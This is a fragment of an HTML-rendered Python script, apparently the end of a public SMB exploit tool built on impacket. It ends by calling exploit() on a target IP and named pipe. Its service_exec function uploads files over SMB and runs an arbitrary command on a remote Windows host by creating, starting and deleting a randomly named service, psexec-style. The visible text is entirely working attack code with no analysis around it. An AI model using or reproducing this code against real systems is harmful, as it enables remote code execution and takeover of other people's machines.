&#09;&#09;smbConn.putFile(remoteDrive + '$', remotePath, fp.read)<br/>
<br/>
# based on impacket/examples/serviceinstall.py<br/>
# Note: using Windows Service to execute command same as how psexec works<br/>
def service_exec(conn, cmd):<br/>
&#09;import random<br/>
&#09;import string<br/>
&#09;from impacket.dcerpc.v5 import transport, srvs, scmr<br/>
&#09;<br/>
&#09;service_name = ''.join([random.choice(string.letters) for i in range(4)])<br/>
<br/>
&#09;# Setup up a DCE SMBTransport with the connection already in place<br/>
&#09;rpcsvc = conn.get_dce_rpc('svcctl')<br/>
&#09;rpcsvc.connect()<br/>
&#09;rpcsvc.bind(scmr.MSRPC_UUID_SCMR)<br/>
&#09;svcHandle = None<br/>
&#09;try:<br/>
&#09;&#09;print("Opening SVCManager on %s....." % conn.get_remote_host())<br/>
&#09;&#09;resp = scmr.hROpenSCManagerW(rpcsvc)<br/>
&#09;&#09;svcHandle = resp['lpScHandle']<br/>
&#09;&#09;<br/>
&#09;&#09;# First we try to open the service in case it exists. If it does, we remove it.<br/>
&#09;&#09;try:<br/>
&#09;&#09;&#09;resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+'\x00')<br/>
&#09;&#09;except Exception as e:<br/>
&#09;&#09;&#09;if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') == -1:<br/>
&#09;&#09;&#09;&#09;raise e &nbsp;# Unexpected error<br/>
&#09;&#09;else:<br/>
&#09;&#09;&#09;# It exists, remove it<br/>
&#09;&#09;&#09;scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])<br/>
&#09;&#09;&#09;scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])<br/>
&#09;&#09;<br/>
&#09;&#09;print('Creating service %s.....' % service_name)<br/>
&#09;&#09;resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')<br/>
&#09;&#09;serviceHandle = resp['lpServiceHandle']<br/>
&#09;&#09;<br/>
&#09;&#09;if serviceHandle:<br/>
&#09;&#09;&#09;# Start service<br/>
&#09;&#09;&#09;try:<br/>
&#09;&#09;&#09;&#09;print('Starting service %s.....' % service_name)<br/>
&#09;&#09;&#09;&#09;scmr.hRStartServiceW(rpcsvc, serviceHandle)<br/>
&#09;&#09;&#09;&#09;# is it really need to stop?<br/>
&#09;&#09;&#09;&#09;# using command line always makes starting service fail because SetServiceStatus() does not get called<br/>
&#09;&#09;&#09;&#09;#print('Stoping service %s.....' % service_name)<br/>
&#09;&#09;&#09;&#09;#scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)<br/>
&#09;&#09;&#09;except Exception as e:<br/>
&#09;&#09;&#09;&#09;print(str(e))<br/>
&#09;&#09;&#09;<br/>
&#09;&#09;&#09;print('Removing service %s.....' % service_name)<br/>
&#09;&#09;&#09;scmr.hRDeleteService(rpcsvc, serviceHandle)<br/>
&#09;&#09;&#09;scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)<br/>
&#09;except Exception as e:<br/>
&#09;&#09;print("ServiceExec Error on: %s" % conn.get_remote_host())<br/>
&#09;&#09;print(str(e))<br/>
&#09;finally:<br/>
&#09;&#09;if svcHandle:<br/>
&#09;&#09;&#09;scmr.hRCloseServiceHandle(rpcsvc, svcHandle)<br/>
<br/>
&#09;rpcsvc.disconnect()<br/>
<br/>
<br/>
if len(sys.argv) &lt; 2:<br/>
&#09;print("{} &lt;ip&gt; [pipe_name]".format(sys.argv[0]))<br/>
&#09;sys.exit(1)<br/>
<br/>
target = sys.argv[1]<br/>
pipe_name = None if len(sys.argv) &lt; 3 else sys.argv[2]<br/>
<br/>
exploit(target, pipe_name)<br/>
print('Done')</body></html>